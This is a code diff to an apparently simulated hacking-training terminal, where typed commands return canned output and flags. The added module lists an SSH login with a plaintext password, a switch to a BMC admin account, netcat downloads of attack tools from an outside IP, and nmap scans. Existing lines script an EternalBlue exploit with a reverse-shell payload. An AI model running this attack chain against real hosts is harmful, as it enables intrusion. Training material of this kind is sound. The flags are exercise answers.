@@ -289,7 +289,17 @@ initializeDatabaseConnection()
                 'use exploit/windows/smb/ms17_010_eternalblue': () => `msf exploit(windows/smb/ms17_010_eternalblue)>\r\n`,
                 'set payload generic/shell_reverse_tcp': () => `payload => generic/shell_reverse_tcp\r\n`,
                 'exploit': () => `Exploiting 192.168.1.103....\n....\nExploited....\nFLAG: u46U0o\r\n`,
-                'help-module1': () => `Available Module 1 Commands:\n- nmap -p 139,445 192.168.1.0/24\n- msfconsole\n- use auxiliary/scanner/smb/smb_ms17_010\n- set RHOST 192.168.1.103\n- run\n- use exploit/windows/smb/ms17_010_eternalblue\n- set payload generic/shell_reverse_tcp\nFor more information on each command, please refer to the respective tool's documentation.\r\n`
+                'help-module1': () => `Available Module 1 Commands:\n- nmap -p 139,445 192.168.1.0/24\n- msfconsole\n- use auxiliary/scanner/smb/smb_ms17_010\n- set RHOST 192.168.1.103\n- run\n- use exploit/windows/smb/ms17_010_eternalblue\n- set payload generic/shell_reverse_tcp\nFor more information on each command, please refer to the respective tool's documentation.\r\n`,
+                
+                'ssh 192.168.1.47': () => `Username: faziodavid\r\nPassword: 1aB3cD7e\r\nLast login: Thu Jan 25 16:43:27 2024 from 192.168.1.47\nfaziodavid@Ubuntu:$`,
+                'su - bmcadmin': () => `Switched to BMC default user successfully.`,
+                'nc 74.233.19.204 12345 > nmap.tar.gz': () => `Downloaded nmap tool successfully.`,
+                'nc 74.233.19.204 12345 > metasploit.tar.gz': () => `Downloaded Metasploit tool successfully.`,
+                'tar -xzf nmap.tar.gz': () => `Unzipped nmap tool successfully.`,
+                'tar -xzf metasploit.tar.gz': () => `Unzipped Metasploit tool successfully.`,
+                'nmap 192.168.1.47': () => `Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for 192.168.1.47\nHost is up (0.012s latency).\nPORT STATE SERVICE\n80/tcp open http\n135/tcp open msrpc\n139/tcp open netbios-ssn\n623/tcp open ipmi\n`,
+                'nmap -sV -p 135 192.168.1.47': () => `Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for 192.168.1.47\nPORT STATE SERVICE VERSION\n135/tcp open msrpc Microsoft Windows RPC\n(unauthenticated) 5.1 (Windows 10)\n\nFLAG: HivRzt`,
+                'help-module2': () => `Available Module 2 Commands:\n- ssh 192.168.1.47\n- su - bmcadmin\n- nc 74.233.19.204 12345 > nmap.tar.gz\n- nc 74.233.19.204 12345 > metasploit.tar.gz\n- tar -xzf nmap.tar.gz\n- tar -xzf metasploit.tar.gz\n- nmap 192.168.1.47\n- nmap -sV -p 135 192.168.1.47\nFor more information on each command, please refer to the respective tool's documentation.\r\n`
             };
             
 
